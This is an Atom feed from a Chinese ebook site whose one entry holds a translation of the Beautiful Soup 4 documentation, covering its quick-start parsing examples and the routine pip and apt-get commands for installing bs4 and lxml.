<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>计算机电子书</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://it-ebooks.flygon.net/"/>
  <updated>2016-03-12T13:34:15.673Z</updated>
  <id>http://it-ebooks.flygon.net/</id>
  
  <author>
    <name>Flygon</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Beautiful Soup 4.2.0 中文文档</title>
    <link href="http://it-ebooks.flygon.net/beautiful-soup-doc/"/>
    <id>http://it-ebooks.flygon.net/beautiful-soup-doc/</id>
    <published>2016-03-12T13:05:42.000Z</published>
    <updated>2016-03-12T13:34:15.673Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;http://www.crummy.com/software/BeautifulSoup/bs4/doc/_images/6.1.jpg&quot; alt=&quot;http://www.crummy.com/software/BeautifulSoup/bs4/doc/_images/6.1.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Beautiful Soup&lt;/a&gt; 是一个可以从HTML或XML文件中提取数据的Python库.它能够通过你喜欢的转换器实现惯用的文档导航,查找,修改文档的方式.Beautiful Soup会帮你节省数小时甚至数天的工作时间.&lt;/p&gt;
&lt;p&gt;这篇文档介绍了BeautifulSoup4中所有主要特性,并切有小例子.让我来向你展示它适合做什么,如何工作,怎样使用,如何达到你想要的效果,和处理异常情况.&lt;/p&gt;
&lt;p&gt;文档中出现的例子在Python2.7和Python3.2中的执行结果相同&lt;/p&gt;
&lt;p&gt;你可能在寻找 &lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/bs3/documentation.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Beautiful Soup3&lt;/a&gt; 的文档,Beautiful Soup 3 目前已经停止开发,我们推荐在现在的项目中使用Beautiful Soup 4, &lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;移植到BS4&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;寻求帮助&quot;&gt;&lt;a href=&quot;#寻求帮助&quot; class=&quot;headerlink&quot; title=&quot;寻求帮助&quot;&gt;&lt;/a&gt;寻求帮助&lt;/h2&gt;&lt;p&gt;如果你有关于BeautifulSoup的问题,可以发送邮件到 &lt;a href=&quot;https://groups.google.com/forum/?fromgroups#!forum/beautifulsoup&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;讨论组&lt;/a&gt; .如果你的问题包含了一段需要转换的HTML代码,那么确保你提的问题描述中附带这段HTML文档的 &lt;a href=&quot;#id60&quot;&gt;代码诊断&lt;/a&gt; [1]&lt;/p&gt;
&lt;h1 id=&quot;快速开始&quot;&gt;&lt;a href=&quot;#快速开始&quot; class=&quot;headerlink&quot; title=&quot;快速开始&quot;&gt;&lt;/a&gt;快速开始&lt;/h1&gt;&lt;p&gt;下面的一段HTML代码将作为例子被多次用到.这是 &lt;em&gt;爱丽丝梦游仙境的&lt;/em&gt; 的一段内容(以后内容中简称为 &lt;em&gt;爱丽丝&lt;/em&gt; 的文档):&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;html_doc = &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;title&amp;quot;&amp;gt;&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;Once upon a time there were three little sisters; and their names were&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/elsie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/lacie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt; and&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/tillie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;and they lived at the bottom of a well.&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;...&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用BeautifulSoup解析这段代码,能够得到一个 &lt;code&gt;BeautifulSoup&lt;/code&gt; 的对象,并能按照标准的缩进格式的结构输出:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from bs4 import BeautifulSoup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(html_doc)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(soup.prettify())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    The Dormouse&amp;apos;s story&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;p class=&amp;quot;title&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#     The Dormouse&amp;apos;s story&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    Once upon a time there were three little sisters; and their names were&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#     Elsie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    ,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#     Lacie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    and&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#     Tillie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    &amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    ; and they lived at the bottom of a well.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   &amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;几个简单的浏览结构化数据的方法:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.title&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.title.name&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;title&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.title.string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;The Dormouse&amp;apos;s story&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.title.parent.name&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;head&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.p&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;p class=&amp;quot;title&amp;quot;&amp;gt;&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.p[&amp;apos;class&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;title&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;apos;a&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find(id=&amp;quot;link3&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从文档中找到所有&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签的链接:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for link in soup.find_all(&amp;apos;a&amp;apos;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(link.get(&amp;apos;href&amp;apos;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # http://example.com/elsie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # http://example.com/lacie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # http://example.com/tillie&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从文档中获取所有文字内容:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;print(soup.get_text())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# The Dormouse&amp;apos;s story&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# The Dormouse&amp;apos;s story&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Once upon a time there were three little sisters; and their names were&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Elsie,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Lacie and&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Tillie;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# and they lived at the bottom of a well.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这是你想要的吗?别着急,还有更好用的&lt;/p&gt;
&lt;h1 id=&quot;安装-Beautiful-Soup&quot;&gt;&lt;a href=&quot;#安装-Beautiful-Soup&quot; class=&quot;headerlink&quot; title=&quot;安装 Beautiful Soup&quot;&gt;&lt;/a&gt;安装 Beautiful Soup&lt;/h1&gt;&lt;p&gt;如果你用的是新版的Debain或ubuntu,那么可以通过系统的软件包管理来安装:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ apt-get install Python-bs4&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Beautiful Soup 4 通过PyPi发布,所以如果你无法使用系统包管理安装,那么也可以通过 &lt;code&gt;easy_install&lt;/code&gt; 或 &lt;code&gt;pip&lt;/code&gt; 来安装.包的名字是 &lt;code&gt;beautifulsoup4&lt;/code&gt; ,这个包兼容Python2和Python3.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ easy_install beautifulsoup4&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ pip install beautifulsoup4&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;(在PyPi中还有一个名字是 &lt;code&gt;BeautifulSoup&lt;/code&gt; 的包,但那可能不是你想要的,那是 &lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/bs3/documentation.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Beautiful Soup3&lt;/a&gt; 的发布版本,因为很多项目还在使用BS3, 所以 &lt;code&gt;BeautifulSoup&lt;/code&gt; 包依然有效.但是如果你在编写新项目,那么你应该安装的 &lt;code&gt;beautifulsoup4&lt;/code&gt; )&lt;/p&gt;
&lt;p&gt;如果你没有安装 &lt;code&gt;easy_install&lt;/code&gt; 或 &lt;code&gt;pip&lt;/code&gt; ,那你也可以 &lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/download/4.x/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;下载BS4的源码&lt;/a&gt; ,然后通过setup.py来安装.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ Python setup.py install&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果上述安装方法都行不通,Beautiful Soup的发布协议允许你将BS4的代码打包在你的项目中,这样无须安装即可使用.&lt;/p&gt;
&lt;p&gt;作者在Python2.7和Python3.2的版本下开发Beautiful Soup, 理论上Beautiful Soup应该在所有当前的Python版本中正常工作&lt;/p&gt;
&lt;h2 id=&quot;安装完成后的问题&quot;&gt;&lt;a href=&quot;#安装完成后的问题&quot; class=&quot;headerlink&quot; title=&quot;安装完成后的问题&quot;&gt;&lt;/a&gt;安装完成后的问题&lt;/h2&gt;&lt;p&gt;Beautiful Soup发布时打包成Python2版本的代码,在Python3环境下安装时,会自动转换成Python3的代码,如果没有一个安装的过程,那么代码就不会被转换.&lt;/p&gt;
&lt;p&gt;如果代码抛出了 &lt;code&gt;ImportError&lt;/code&gt; 的异常: “No module named HTMLParser”, 这是因为你在Python3版本中执行Python2版本的代码.&lt;/p&gt;
&lt;p&gt;如果代码抛出了 &lt;code&gt;ImportError&lt;/code&gt; 的异常: “No module named html.parser”, 这是因为你在Python2版本中执行Python3版本的代码.&lt;/p&gt;
&lt;p&gt;如果遇到上述2种情况,最好的解决方法是重新安装BeautifulSoup4.&lt;/p&gt;
&lt;p&gt;如果在ROOT_TAG_NAME = u’[document]’代码处遇到 &lt;code&gt;SyntaxError&lt;/code&gt; “Invalid syntax”错误,需要将把BS4的Python代码版本从Python2转换到Python3. 可以重新安装BS4:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ Python3 setup.py install&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或在bs4的目录中执行Python代码版本转换脚本&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ 2to3-3.2 -w bs4&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;安装解析器&quot;&gt;&lt;a href=&quot;#安装解析器&quot; class=&quot;headerlink&quot; title=&quot;安装解析器&quot;&gt;&lt;/a&gt;安装解析器&lt;/h2&gt;&lt;p&gt;Beautiful Soup支持Python标准库中的HTML解析器,还支持一些第三方的解析器,其中一个是 &lt;a href=&quot;http://lxml.de/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;lxml&lt;/a&gt; .根据操作系统不同,可以选择下列方法来安装lxml:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ apt-get install Python-lxml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ easy_install lxml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ pip install lxml&lt;/code&gt;&lt;/p&gt;
